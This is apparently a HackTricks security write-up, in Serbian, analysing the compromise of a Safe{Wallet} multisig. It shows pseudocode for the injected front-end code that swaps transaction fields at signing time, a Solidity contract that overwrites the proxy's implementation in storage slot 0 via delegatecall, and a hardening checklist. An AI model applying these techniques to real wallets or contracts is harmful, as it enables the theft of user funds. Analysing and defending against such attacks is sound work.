# Kompromitacija Web3 procesa potpisivanja i preuzimanje Safe proxy-ja putem delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Pregled

Lanac krađe cold-wallet-a je spojio **supply-chain kompromitovanje Safe{Wallet} web UI** sa **on-chain delegatecall primitivom koji je prepisao pokazivač implementacije proxy-ja (slot 0)**. Ključne poruke su:

- Ako dApp može da ubaci kod u put potpisivanja, može naterati potpisivača da proizvede validan **EIP-712 signature over attacker-chosen fields** dok istovremeno vraća originalne UI podatke tako da ostali potpisivači ne primete.
- Safe proxies čuvaju `masterCopy` (implementation) u **storage slot 0**. delegatecall ka contractu koji piše u slot 0 efektivno „nadograđuje“ Safe na logiku napadača, dajući potpunu kontrolu nad wallet-om.

## Off-chain: Ciljana mutacija potpisivanja u Safe{Wallet}

Izmenjeni Safe bundle (`_app-*.js`) selektivno je napadao određene Safe + signer adrese. Ubačena logika izvršavala se neposredno pre poziva za potpisivanje:
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Attack properties
- **Context-gated**: hard-coded allowlists za pogođene Safes/signers su sprečavale šum i smanjivale detekciju.
- **Last-moment mutation**: polja (`to`, `data`, `operation`, gas) su prepisivana neposredno pre `signTransaction`, a zatim vraćana, tako da su payload-ovi predloga u UI delovali benigno dok su potpisi odgovarali payload-u napadača.
- **EIP-712 opacity**: walleti su prikazivali strukturirane podatke ali nisu dekodirali ugnezdeni calldata niti isticali `operation = delegatecall`, čineći mutiranu poruku efektivno potpisanu na slepo.

### Gateway validation relevance
Safe proposals are submitted to the **Safe Client Gateway**. Pre uvođenja ojačanih provera, gateway je mogao prihvatiti predlog u kome su `safeTxHash`/potpis odgovarali različitim poljima u odnosu na JSON body ako bi UI prepravio polja nakon potpisivanja. Posle incidenta, gateway sada odbacuje predloge čiji hash/potpis ne odgovaraju podnetoj transakciji. Slična serverska verifikacija hasha treba biti primenjena na svaki signing-orchestration API.

## On-chain: Delegatecall proxy takeover via slot collision

Safe proxies keep `masterCopy` at **storage slot 0** and delegate all logic to it. Pošto Safe podržava **`operation = 1` (delegatecall)**, svaka potpisana transakcija može da se odnosi na proizvoljan kontrakt i izvrši njegov kod u storage kontekstu proxy-ja.

Kontrakt napadača je imitirao ERC-20 `transfer(address,uint256)`, ali je umesto toga upisao `_to` u slot 0:
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Tok izvršenja:
1. Žrtve potpisuju `execTransaction` sa `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy validira potpise nad ovim parametrima.
3. Proxy izvršava delegatecall u `attackerContract`; telo `transfer` upisuje slot 0.
4. Slot 0 (`masterCopy`) sada pokazuje na logiku pod kontrolom napadača → **potpuno preuzimanje novčanika i isisavanje sredstava**.

## Detekcija i kontrolna lista za jačanje sigurnosti

- **Integritet UI-a**: pin JS assets / SRI; pratiti bundle difs; tretirati UI za potpisivanje kao deo granice poverenja.
- **Validacija u trenutku potpisivanja**: hardware wallets sa **EIP-712 clear-signing**; eksplicitno prikažite `operation` i dekodirajte ugnježdeni calldata. Odbijte potpisivanje kada je `operation = 1` osim ako politika to ne dozvoljava.
- **Provere hash-a na serverskoj strani**: gateways/services koji prosleđuju predloge moraju ponovo izračunati `safeTxHash` i proveriti da potpisi odgovaraju podnetim poljima.
- **Politike/allowlists**: preflight pravila za `to`, selektore, tipove asset-a, i zabrana delegatecall osim za proverene tokove. Zahtevajte internu policy službu pre nego što emituјete potpuno potpisane transakcije.
- **Dizajn kontrakta**: izbegavajte izlaganje proizvoljnog delegatecall u multisig/treasury wallet-ima osim ako nije apsolutno neophodno. Postavite pokazivače za upgrade van slot-a 0 ili zaštitite sa eksplicitnom upgrade logikom i kontrolom pristupa.
- **Monitoring**: alarmirajte na izvršenja delegatecall iz wallet-a koji drže trezorska sredstva, i na predloge koji menjaju `operation` u odnosu na tipične `call` obrasce.

## References

- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
